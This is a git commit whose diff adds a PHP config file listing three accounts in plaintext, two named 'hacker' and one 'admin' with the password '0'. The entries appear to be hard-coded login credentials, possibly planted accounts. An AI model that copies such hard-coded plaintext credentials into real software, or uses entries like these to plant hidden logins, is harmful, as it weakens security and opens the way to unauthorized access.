19d658071053ec408045d1921d6f3c50f2790329
joe-x5 <Joesmith1052024@gmail.com>
2026-06-22 18:05:27 +0900

    Update config.php

---
+++ config.php
@@ -0,0 +1,19 @@
+<?php
+
+$CONFIG = array (
+    "@" => [
+        "fullname" => "hacker", 
+        "password" => "s12369008",
+    ], 
+    "Vx" => [
+        "fullname" => "hacker", 
+        "password" => "9935476807",
+    ], 
+"vx" => [
+        "fullname" => "admin", 
+        "password" => "0",
+    ], 
+
+);
+
+?>
